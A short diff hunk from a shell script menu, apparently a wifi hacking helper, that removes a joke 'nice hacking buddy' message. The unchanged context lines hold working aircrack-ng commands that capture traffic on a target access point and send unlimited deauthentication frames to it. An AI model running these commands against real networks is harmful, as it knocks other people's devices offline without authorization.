@@ -76,7 +76,6 @@ hacking
 airodump-ng --bssid $bssid --channel $ch wlan0mon
 aireplay-ng -0 0 -a $bssid wlan0mon 
     ;;
-  3) echo -e "$(tput setaf 1)\n\033[1mnice hacking buddy,\nH:)\n"
      break;
     ;;
   *) echo -e "$(tput setaf 1)Please select correct option.$(tput setaf 7)"
